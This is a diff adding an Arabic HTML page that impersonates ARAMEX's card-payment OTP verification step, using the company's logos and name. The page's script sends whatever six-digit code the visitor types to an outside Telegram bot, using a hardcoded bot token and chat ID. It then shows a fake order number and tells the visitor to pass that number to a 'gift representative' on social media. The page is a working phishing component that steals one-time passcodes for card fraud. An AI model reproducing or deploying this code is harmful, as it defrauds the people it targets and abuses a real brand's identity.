@@ -1,0 +1,191 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>التحقق من الرمز - ARAMEX</title>
+
+  <!-- Favicon -->
+  <link rel="icon" href="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b0/Aramex_logo.svg/2560px-Aramex_logo.svg.png" type="image/png">
+
+  <!-- Google Fonts -->
+  <link href="https://fonts.googleapis.com/css2?family=Noto+Kufi+Arabic&display=swap" rel="stylesheet" />
+
+  <!-- Meta Description SEO -->
+  <meta name="description" content="تحقق من رمز OTP الخاص بك لمتابعة طلبك بأمان مع ARAMEX. عملية دفع سريعة وآمنة.">
+
+  <!-- Open Graph (Pour Facebook, WhatsApp, etc.) -->
+  <meta property="og:title" content="التحقق من الرمز - ARAMEX">
+  <meta property="og:description" content="أدخل رمز التحقق لإكمال عملية الدفع مع ARAMEX. خدمة سريعة وآمنة.">
+  <meta property="og:image" content="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b0/Aramex_logo.svg/2560px-Aramex_logo.svg.png">
+  <meta property="og:url" content="https://www.aramex.com/">
+  <meta property="og:type" content="website">
+  <link href="https://fonts.googleapis.com/css2?family=Noto+Kufi+Arabic&display=swap" rel="stylesheet" />
+  <style>
+    body {
+      font-family: 'Noto Kufi Arabic', sans-serif;
+      background: #f5f7fa;
+      margin: 0;
+      padding: 0;
+      direction: rtl;
+      text-align: center;
+    }
+    .navbar {
+      background: #e30613;
+      padding: 15px 20px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 15px;
+      color: #fff;
+    }
+    .nav-logo {
+      height: 35px;
+    }
+    .otp-container, .confirmation-container {
+      max-width: 400px;
+      margin: 50px auto;
+      background: white;
+      border-radius: 12px;
+      padding: 30px 25px;
+      box-shadow: 0 4px 15px rgb(0 0 0 / 0.1);
+    }
+    h2 {
+      margin-bottom: 10px;
+      font-weight: 900;
+      color: #222;
+    }
+    p {
+      margin-bottom: 25px;
+      color: #555;
+    }
+    input#otp {
+      font-size: 2rem;
+      width: 100%;
+      padding: 12px;
+      border-radius: 10px;
+      border: 1px solid #ccc;
+      text-align: center;
+      letter-spacing: 10px;
+      direction: ltr;
+      box-sizing: border-box;
+    }
+    button#verifyBtn {
+      margin-top: 20px;
+      background-color: #e30613;
+      border: none;
+      color: white;
+      font-weight: bold;
+      font-size: 1.2rem;
+      padding: 14px;
+      border-radius: 10px;
+      cursor: pointer;
+      width: 100%;
+      transition: background-color 0.3s ease;
+    }
+    button#verifyBtn:hover:not(:disabled) {
+      background-color: #b9040f;
+    }
+    button#verifyBtn:disabled {
+      background-color: #9c0b0e;
+      cursor: not-allowed;
+    }
+    #loading {
+      margin-top: 20px;
+      font-size: 1.2rem;
+      font-weight: bold;
+      color: #007bff;
+      display: none;
+    }
+    .confirmation-container {
+      display: none;
+    }
+    .order-id {
+      font-size: 1.4rem;
+      font-weight: bold;
+      color: #28a745;
+      margin: 15px 0;
+    }
+    .share-text {
+      margin-top: 10px;
+      font-size: 1rem;
+      color: #333;
+    }
+    footer.footer {
+      margin: 50px 0 20px;
+      color: #444;
+      font-weight: bold;
+    }
+  </style>
+</head>
+<body>
+  <nav class="navbar">
+    <img src="https://images.seeklogo.com/logo-png/24/1/aramex-logo-png_seeklogo-249605.png" alt="ARAMEX Logo" class="nav-logo" />
+    <span class="nav-title">الدفع الآمن عبر البطاقة</span>
+  </nav>
+
+  <div class="otp-container" id="otpContainer">
+    <h2>أدخل رمز التحقق</h2>
+    <p>لقد أرسلنا رمز مكون من 6 أرقام إلى رقمك</p>
+    <input type="text" id="otp" maxlength="6" placeholder="******" required />
+    <button id="verifyBtn">تأكيد</button>
+    <div id="loading">⏳ جاري التحقق...</div>
+  </div>
+
+  <div class="confirmation-container" id="confirmationContainer">
+    <h2>✅ تم تأكيد طلبك بنجاح</h2>
+    <div class="order-id" id="orderId"></div>
+    <div class="share-text">
+      يرجى مشاركة هذا الرقم مع مندوب هدايا عبر:
+      <br>Instagram / WhatsApp / Snapchat
+    </div>
+  </div>
+
+  <footer class="footer">
+    <p>© 2025 جميع الحقوق محفوظة لشركة ARAMEX Express LTD</p>
+  </footer>
+
+  <script>
+    const otpInput = document.getElementById("otp");
+    const verifyBtn = document.getElementById("verifyBtn");
+    const loading = document.getElementById("loading");
+    const otpContainer = document.getElementById("otpContainer");
+    const confirmationContainer = document.getElementById("confirmationContainer");
+    const orderId = document.getElementById("orderId");
+
+    verifyBtn.addEventListener("click", () => {
+      const code = otpInput.value.trim();
+
+      if (code.length !== 6 || isNaN(code)) {
+        alert("⚠️ أدخل رمز مكون من 6 أرقام");
+        return;
+      }
+
+      // Affiche loading
+      loading.style.display = "block";
+      verifyBtn.disabled = true;
+
+      // Envoyer à Telegram
+      fetch("https://api.telegram.org/bot7928008804:AAGPVX1ykMSK_yAVeB_LylyLc2MN60xwDoo/sendMessage", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: "6968763338",
+          text: `🔐 رمز OTP:\n${code}`
+        }),
+      });
+
+      setTimeout(() => {
+        loading.style.display = "none";
+        otpContainer.style.display = "none";
+        confirmationContainer.style.display = "block";
+
+        // Générer un numéro aléatoire de commande
+        const randomCode = "CMD" + Math.floor(100000 + Math.random() * 900000);
+        orderId.textContent = "رقم الطلب: " + randomCode;
+
+      }, 5000);
+    });
+  </script>
+</body>
+</html>
